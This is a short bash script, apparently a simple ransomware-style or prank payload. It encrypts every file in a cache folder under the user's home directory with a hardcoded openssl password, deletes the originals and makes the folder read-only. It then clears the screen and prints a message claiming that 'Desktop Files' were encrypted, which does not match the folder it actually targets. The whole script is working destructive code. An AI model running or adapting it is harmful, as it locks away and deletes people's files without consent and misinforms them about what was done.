#!/bin/bash
cd ~
DIR="./Library/IChicken/Cache"
PASSWORD="1234"
find "$DIR" -type f ! -name "*.encrypted" | while read -r file; do
    enc_file="${file}.encrypted"
    openssl enc -aes-256-cbc -salt -in "$file" -out "$enc_file" -pass pass:"$PASSWORD"
    echo "Encrypted: $file → $enc_file"
    rm -f "$file"
    echo "Deleted original file: $file"
done
chmod -w "$DIR"
clear
echo "Desktop Files have been encrypted."

